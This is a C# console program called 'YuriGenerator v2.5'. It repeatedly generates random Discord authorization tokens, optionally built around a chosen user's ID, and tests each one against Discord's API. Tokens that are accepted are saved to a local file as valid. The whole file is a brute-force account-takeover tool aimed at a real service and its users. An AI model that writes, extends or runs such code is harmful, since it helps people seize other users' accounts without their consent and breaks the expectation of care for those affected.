using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net;
using System.Net.Http;
using System.IO;

namespace Discord_Token_Generator
{
    internal class Program
    {
        static int foundtokens = 0;
        static int triedtokens = 0;
        static int requests = 0;
        static int rps = 0;
        static string userID = "";
        static void Main(string[] args)
        {
            Random random = new Random(DateTime.Now.Millisecond);
            new Thread(() =>
            {
                Console.Title = "YuriGenerator v2.5; Starting.";
                while (true)
                {
                    Console.Title = "YuriGenerator v2.5; Tried tokens: "+ triedtokens.ToString() +"; Found tokens: " + foundtokens + "; RequestPS Count: " + rps.ToString() + "; userID: " + userID + "";
                }
            }).Start();
            new Thread(() =>
            {
                while (true)
                {
                    rps = requests;
                    rps = (rps + requests) / 2;
                    requests = 0;
                    Thread.Sleep(1000);
                }
            }).Start();

            File.Create("validTokens.txt").Dispose();
            Console.WriteLine("(For Any Specified User) User ID: ");
            userID = Console.ReadLine();
            if (userID == "0" || userID == "" || userID == "null")
            {
                userID = "None";
            } else
            {
                if (userID.Length != 18)
                {
                    userID = "None";
                }
            }
            Console.ForegroundColor = ConsoleColor.Red;
            while (true)
            {
                requests++;
                generateToken(random, userID).GetAwaiter().GetResult();
            }
        }

        private static async Task generateToken(Random random, string userID)
        {
            string token = "";
            if (userID != "None")
            {
                token = Convert.ToBase64String(Encoding.UTF8.GetBytes(userID));
            } else
            {
                for (int i = 0; i < 24; i++)
                {
                    token += randAscii();
                }
            }
            token += ".";
            for (int i = 0; i < 6; i++)
            {
                token += randAscii();
            }
            token += ".";
            for (int i = 0; i < 27; i++)
            {
                token += randAscii();
            }

            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("https://discordapp.com/api/v6/users/@me/library");
            client.DefaultRequestHeaders.Add("authorization", token);

            HttpResponseMessage response = await client.GetAsync("https://discordapp.com/api/v6/users/@me/library");

            if (response.StatusCode == HttpStatusCode.OK)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(token);
                foundtokens++;
                while (true)
                {
                    try
                    {
                        File.WriteAllText("validTokens.txt", File.ReadAllText("validTokens.txt") + "\n" + token);
                        Console.WriteLine("Token saved to the file.");
                        break;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                    }
                }
                Thread.Sleep(2000);
                Console.ForegroundColor = ConsoleColor.Red;
            }
            else if (response.StatusCode == HttpStatusCode.Unauthorized)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(token);
            } else
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Error type: " + response.StatusCode.ToString());
                Console.ForegroundColor = ConsoleColor.Red;
            }

            triedtokens++;

            string randAscii()
            {
                if (random.Next(1, 3) == 2)
                {
                    return randLet();
                }
                else
                {
                    return randNum();
                }
            }

            string randLet()
            {
                string randlet = ((char)random.Next(65, 91)).ToString();

                if (random.Next(1, 3) == 2)
                {
                    return randlet;
                }
                else
                {
                    return randlet.ToLower();
                }
            }
            string randNum()
            {
                return ((char)random.Next(48, 58)).ToString();
            }
        }
    }
}
